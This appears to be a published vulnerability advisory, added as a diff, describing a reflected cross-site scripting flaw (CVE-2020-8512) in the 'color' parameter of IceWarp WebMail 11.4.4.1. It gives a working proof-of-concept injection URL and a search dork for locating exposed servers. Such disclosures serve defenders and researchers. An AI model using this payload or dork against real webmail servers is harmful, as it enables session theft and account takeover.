@@ -1,0 +1,34 @@
+# Title: IceWarp WebMail 11.4.4.1 - Reflective Cross-Site Scripting
+# Date: 2020-01-27
+# Author: Lutfu Mert Ceylan
+# Vendor Homepage: www.icewarp.com
+# Tested on: Windows 10
+# Versions: 11.4.4.1 and before
+# Vulnerable Parameter: "color" (Get Method)
+# Google Dork: inurl:/webmail/ intext:Powered by IceWarp Server
+# CVE: CVE-2020-8512
+
+# Notes:
+
+# An attacker can use XSS (in color parameter IceWarp WebMail 11.4.4.1 and
+# before)to send a malicious script to an unsuspecting Admins or users. The
+# end admins or useras browser has no way to know that the script should not
+# be trusted, and will execute the script. Because it thinks the script came
+# from a trusted source, the malicious script can access any cookies, session
+# tokens, or other sensitive information retained by the browser and used
+# with that site. These scripts can even rewrite the content of the HTML
+# page. Even an attacker can easily place users in social engineering through
+# this vulnerability and create a fake field.
+
+# PoC:
+
+# Go to Sign-in page through this path: http://localhost/webmail/ or
+http://localhost:32000/webmail/
+
+# Add the "color" parameter to the URL and write malicious code, Example:
+http://localhost/webmail/?color="><svg/onload=alert(1)>
+
+# When the user goes to the URL, the malicious code is executed
+
+Example Vulnerable URL: http://localhost/webmail/?color=
+"><svg/onload=alert(1)>
